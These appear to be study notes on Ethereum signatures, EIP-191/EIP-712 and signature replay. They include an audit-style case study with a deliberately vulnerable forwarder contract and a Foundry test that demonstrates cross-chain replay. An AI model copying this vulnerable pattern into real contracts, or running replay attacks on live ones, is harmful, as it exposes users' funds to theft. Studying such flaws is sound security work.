# Part 1: What is a Signature?

A signature is created by ECDSA (ELLIPTIC CURVE DIGITAL SIGNATURE) off chain and can be verified on-chain.

A typical ethereum signature has 3 components;

- r (32 bytes)
- s (32 bytes)
- v (1 byte, recovery id: either 27/28 or 0/1)

The signature proves that a message was signed by a specific holder of a private key ==without revealing the private key==.


# Part 2: What gets signed?

This is where EIP-191 and EIP-712 come in 

EIP-191 was exactly how messages used to be signed it only ever displayed bytes realistically a real world people want to see the transaction in a readable format. EIP-191 followed a format of:
`\x19` - prefix
`\0x45` - version
`s`  data

### EIP-712: Typed Structured Data 

```js
function getSignerEIP712(uint256 message, uint8 _v, bytes32 _r, bytes32 _s) public view returns (address) { 
// Arguments when calculating hash to validate // 1: byte(0x19) - the initial 0x19 byte 
// 2: byte(1) - the version byte 
// 3: hashstruct of domain separator (includes the typehash of the domain struct) 
// 4: hashstruct of message (includes the typehash of the message struct) 

bytes1 prefix = bytes1(0x19); 
bytes1 eip712Version = bytes1(0x01); // EIP-712 is version 1 of EIP-191 
bytes32 hashStructOfDomainSeparator = i_domain_separator; // hash the 
message struct bytes32 hashedMessage = keccak256(abi.encode(MESSAGE_TYPEHASH, Message({ number: message }))); // And finally, combine them all 
bytes32 digest = keccak256(abi.encodePacked(prefix, eip712Version, hashStructOfDomainSeparator, hashedMessage)); 
return ecrecover(digest, _v, _r, _s); 
}
```

```js
function verifySigner712( uint256 message, uint8 _v, bytes32 _r, bytes32 _s, address signer ) public view returns (bool) { address actualSigner = getSignerEIP712(message, _v, _r, _s); 
require(signer == actualSigner); return true; }
```


## What is Signature replay?

This is a kind of exploit that occurs when an attacker uses the same signature of a victim (after signing offline his signature is then recorded on-chain) to sign another transaction there by getting funds from said victim;
This can be caused by many reasons but mostly around;
1.  Using the right signing standard
2.  Making sure to use a nonce (Some form of unique counter)
3. Using a chainID to prevent cross chain signature replay
4. Adding a deadline to prevent attacker from storing signature indefinitely and executing at any time.



## Case Study

Next-generation 
Date: - PUBLISHED May 12, 2025

## [H-01]  Cross chain signature replay due to user supplied `domainSeperator` and missing deadline check

see [[Next-generation]]

A typical simulated test case of what happened;


`Forwarder.sol`

```js
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.25;

  

contract VulnerableForwarder {

mapping(address => uint256) public nonces;

  

struct ForwardRequest {

address from;

address to;

uint256 value;

uint256 gas;

uint256 nonce;

bytes data;

}

  
//@audit user supplied domainSeperator risk of cross chain replay
/*
	Domain seperator is used to include domain specific data which 
	helps prevent replay but its user supplied---recipe for disaster
*/
function getDigest(ForwardRequest memory req, bytes32 domainSeparator) public pure returns (bytes32) {

bytes32 encoded = keccak256(abi.encodePacked(

req.from, req.to, req.value, req.gas, req.nonce, keccak256(req.data)

));

return keccak256(abi.encodePacked("\x19\x01", domainSeparator, encoded));

}

  

function execute(

ForwardRequest calldata req,

bytes32 domainSeparator,

bytes calldata sig

) external returns (bytes memory) {

// c! the nonce has been used

require(req.nonce == nonces[req.from], "Invalid nonce");

  

bytes32 digest = getDigest(req, domainSeparator);

address recovered = _recover(digest, sig);

require(recovered == req.from, "Invalid signature");

  

nonces[req.from]++;

  

(bool success, bytes memory data) = req.to.call{value: req.value}(req.data);

require(success, "Call failed");

return data;

}

  

function _recover(bytes32 digest, bytes memory sig) internal pure returns (address) {

(uint8 v, bytes32 r, bytes32 s) = abi.decode(sig, (uint8, bytes32, bytes32));

return ecrecover(digest, v, r, s);

}

}
```


`Forwarder.t.sol`

```js
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.25;

  

import "forge-std/Test.sol";

import "../src/Forwarded.sol";

  

contract ForwarderTest is Test {

VulnerableForwarder public forwarderA;

VulnerableForwarder public forwarderB;

  

address public user;

uint256 private userPk;

  

function setUp() public {

forwarderA = new VulnerableForwarder();

forwarderB = new VulnerableForwarder();

  

userPk = uint256(keccak256("user"));

user = vm.addr(userPk);

}

  

function testCrossChainReplay() public {

bytes32 domainSeparator = keccak256("not_using_chainid"); // fake domain

  

// Create a forward request

VulnerableForwarder.ForwardRequest memory req = VulnerableForwarder

.ForwardRequest({

from: user,

to: address(0x1337), // dummy address

value: 0,

gas: 100_000,

nonce: 0,

data: ""

});

  

// Sign it

bytes32 digest = forwarderA.getDigest(req, domainSeparator);

(uint8 v, bytes32 r, bytes32 s) = vm.sign(userPk, digest);

bytes memory sig = abi.encode(v, r, s);

  

// First execution (Chain A)

vm.prank(address(0xbeef));

forwarderA.execute(req, domainSeparator, sig);

  

// Replay on "Chain B" (fresh contract, same nonce)

vm.prank(address(0xbeef));

forwarderB.execute(req, domainSeparator, sig); //  Success: replay!

}

}
```






